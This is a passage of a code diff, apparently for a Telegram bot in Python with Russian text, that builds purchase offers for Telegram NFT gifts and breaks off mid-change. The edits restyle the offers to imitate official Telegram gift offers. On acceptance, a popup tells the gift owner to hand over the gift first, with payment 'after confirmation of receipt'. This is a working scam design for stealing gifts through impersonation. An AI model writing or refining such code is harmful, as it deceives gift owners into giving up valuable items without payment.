@@ -25,7 +25,6 @@ class OfferState(StatesGroup):
     waiting_for_price = State()
     waiting_for_currency = State()
 
-# ===== Клавиатуры =====
 def main_kb():
     return ReplyKeyboardMarkup(
         keyboard=[
@@ -35,7 +34,6 @@ def main_kb():
         resize_keyboard=True
     )
 
-# ===== Проверка подписки =====
 async def is_subscribed(user_id: int) -> bool:
     if user_id == OWNER_ID:
         return True
@@ -49,49 +47,39 @@ async def is_subscribed(user_id: int) -> bool:
     except Exception:
         return False
 
-# ===== Старт =====
 @dp.message(Command("start"))
 @dp.message(F.text == "Старт")
 async def start(message: types.Message):
     await message.answer(
         "Бот для создания офферов на подарки Telegram.\n\n"
-        "Нажми «Создать оффер» или пришли ссылку на подарок.\n\n"
-        "Также можно использовать команду:\n"
-        "<code>/offer ссылка цена валюта</code>",
+        "Нажми «Создать оффер» или пришли ссылку на подарок.",
         reply_markup=main_kb()
     )
 
-# ===== Подписка =====
 @dp.message(F.text == "Подписка")
 async def subscription_info(message: types.Message):
     if message.from_user.id == OWNER_ID:
         await message.answer("Ты владелец бота. Подписка не нужна.")
         return
 
-    subscribed = await is_subscribed(message.from_user.id)
-    if subscribed:
+    if await is_subscribed(message.from_user.id):
         await message.answer("Подписка активна. Можешь создавать офферы.")
     else:
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
         ])
         await message.answer(
-            "Для создания офферов нужно подписаться на канал.\n\n"
-            "После подписки нажми «Создать оффер» ещё раз.",
+            "Для создания офферов нужно подписаться на канал.",
             reply_markup=kb
         )
 
-# ===== Создание оффера (кнопка) =====
 @dp.message(F.text == "Создать оффер")
 async def create_offer_btn(message: types.Message):
     if not await is_subscribed(message.from_user.id):
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
         ])
-        await message.answer(
-            "Сначала подпишись на канал, чтобы создавать офферы.",
-            reply_markup=kb
-        )
+        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
         return
 
     await message.answer(
@@ -99,7 +87,6 @@ async def create_offer_btn(message: types.Message):
         "<code>https://t.me/nft/Название-123</code>"
     )
 
-# ===== Команда /offer =====
 @dp.message(Command("offer"))
 async def offer_command(message: types.Message):
     if not await is_subscribed(message.from_user.id):
@@ -113,10 +100,8 @@ async def offer_command(message: types.Message):
         parts = message.text.split()
         if len(parts) < 4:
             await message.answer(
-                "Формат:\n"
-                "<code>/offer ссылка цена валюта</code>\n\n"
-                "Пример:\n"
-                "<code>/offer https://t.me/nft/Gift-123 17 gram</code>"
+                "Формат:\n<code>/offer ссылка цена валюта</code>\n\n"
+                "Пример:\n<code>/offer https://t.me/nft/Gift-123 123 stars</code>"
             )
             return
 
@@ -125,7 +110,7 @@ async def offer_command(message: types.Message):
         currency = parts[3].lower()
 
         if not re.match(r"https?://t\.me/nft/\S+", link):
-            await message.answer("Неверная ссылка на подарок")
+            await message.answer("Неверная ссылка")
             return
         if not price.isdigit():
             await message.answer("Цена должна быть числом")
@@ -134,20 +119,22 @@ async def offer_command(message: types.Message):
             await message.answer("Валюта: stars, gram или ton")
             return
 
-        currency_text = {"stars": "Stars", "gram": "Gram", "ton": "TON"}[currency]
+        currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}[currency]
+        gift_name = link.split("/")[-1].replace("-", " #")
 
         text = (
-            f"{link}\n\n"
-            f"<b>Предложение о покупке</b>\n"
-            f"этого подарка за <b>{price} {currency_text}</b>\n\n"
+            f"<b>с помощью @{ (await bot.get_me()).username }</b>\n\n"
+            f"<a href='{link}'>ПОКАЗАТЬ ПОДАРОК</a>\n\n"
+            f"<b>{message.from_user.full_name}</b> предлагает Вам\n"
+            f"<b>{price} {currency_text}</b> за подарок <b>{gift_name}</b>.\n\n"
             f"Предложение действует ещё 24 часа"
         )
 
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Открыть подарок", url=link)],
+            [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=link)],
             [
-                InlineKeyboardButton(text="Принять", callback_data=f"accept:{message.from_user.id}:{price}:{currency}:{link}"),
-                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{message.from_user.id}")
+                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{message.from_user.id}"),
+                InlineKeyboardButton(text="Принять", callback_data=f"accept:{message.from_user.id}:{price}:{currency}:{link}")
             ]
         ])
 
@@ -159,9 +146,8 @@ async def offer_command(message: types.Message):
         await message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
 
     except Exception:
-        await message.answer("Ошибка. Проверь формат команды.")
+        await message.answer("Ошибка. Проверь формат.")
 
-# ===== Обычный режим (ссылка) =====
 @dp.message(F.text.regexp(r"https?://t\.me/nft/\S+"))
 async def got_link(message: types.Message, state: FSMContext):
     if not await is_subscribed(message.from_user.id):
@@ -171,15 +157,14 @@ async def got_link(message: types.Message, state: FSMContext):
         await message.answer("Сначала подпишись на канал.", reply_markup=kb)
         return
 
-    link = message.text.strip()
-    await state.update_data(link=link)
+    await state.update_data(link=message.text.strip())
     await state.set_state(OfferState.waiting_for_price)
     await message.answer("Введи цену (только число):")
 
 @dp.message(OfferState.waiting_for_price)
 async def got_price(message: types.Message, state: FSMContext):
     if not message.text.isdigit():
-        await message.answer("Нужно только число. Попробуй ещё раз:")
+        await message.answer("Нужно только число:")
         return
 
     await state.update_data(price=message.text)
@@ -202,27 +187,28 @@ async def got_currency(callback: CallbackQuery, state: FSMContext):
     price = data.get("price")
     await state.clear()
 
-    currency_text = {"stars": "Stars", "gram": "Gram", "ton": "TON"}[currency]
+    currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}[currency]
+    gift_name = link.split("/")[-1].replace("-", " #")
 
     text = (
-        f"{link}\n\n"
-        f"<b>Предложение о покупке</b>\n"
-        f"этого подарка за <b>{price} {currency_text}</b>\n\n"
+        f"<b>с помощью @{ (await bot.get_me()).username }</b>\n\n"
+        f"<a href='{link}'>ПОКАЗАТЬ ПОДАРОК</a>\n\n"
+        f"<b>{callback.from_user.full_name}</b> предлагает Вам\n"
+        f"<b>{price} {currency_text}</b> за подарок <b>{gift_name}</b>.\n\n"
         f"Предложение действует ещё 24 часа"
     )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Открыть подарок", url=link)],
+        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", url=link)],
         [
-            InlineKeyboardButton(text="Принять", callback_data=f"accept:{callback.from_user.id}:{price}:{currency}:{link}"),
-            InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{callback.from_user.id}")
+            InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{callback.from_user.id}"),
+            InlineKeyboardButton(text="Принять", callback_data=f"accept:{callback.from_user.id}:{price}:{currency}:{link}")
         ]
     ])
 
     await callback.message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
     await callback.answer()
 
-# ===== Кнопки Принять / Отклонить =====
 @dp.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: CallbackQuery):
     parts = callback.data.split(":")
@@ -230,50 +216,16 @@ async def accept_offer(callback: CallbackQuery):
     price = parts[2]
     currency = parts[3]
     link = parts[4] if len(parts) > 4 else ""
+    currency_text = {"stars": "⭐", "gram": "Gram", "ton": "TON"}.get(currency, currency)
+    gift_name = link.split("/")[-1].replace("-", " #") if link else "подарок"
 
-    await callback.answer("Вы приняли предложение")
-    await callback.message.edit_reply_markup(reply_markup=None)
-
-    await callback.message.answer(
-        "Предложение принято.\n\n"
-        "Ожидайте, пока продавец передаст вам подарок."
+    # Всплывающее окно
+    await callback.answer(
+        "Предложение о продаже принято.\n\n"
+        "Следующий этап — передача подарка покупателю. "
+        "Оплата станет доступна после подтверждения получения.",
+        show_alert=True
     )
 
-    try:
-        await bot.send_message(
-            seller_id,
-            f"<b>Подарок продан</b>\n\n"
-            f"Покупатель: @{callback.from_user.username or callback.from_user.full_name}\n"
-            f"Цена: <b>{price} {currency}</b>\n"
-            f"Подарок: {link}\n\n"
-            f"<b>Что делать дальше:</b>\n"
-            f"1. Открой подарок\n"
-            f"2. Нажми «Передать»\n"
-            f"3. Выбери покупателя и подтверди передачу\n\n"
-            f"После передачи ты получишь оплату."
-        )
-    except:
-        pass
-
-@dp.callback_query(F.data.startswith("decline:"))
-async def decline_offer(callback: CallbackQuery):
-    parts = callback.data.split(":")
-    seller_id = int(parts[1])
-
-    await callback.answer("Вы отклонили предложение")
-    await callback.message.edit_reply_markup(reply_markup=None)
-
-    try:
-        await bot.send_message(
-            seller_id,
-            f"Кто-то отклонил твоё предложение.\n"
-            f"Пользователь: @{callback.from_user.username or callback.from_user.full_name}"
-        )
-    except:
-        pass
-
-async def main():
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    # Обновляем сообщение
+    new_text = (
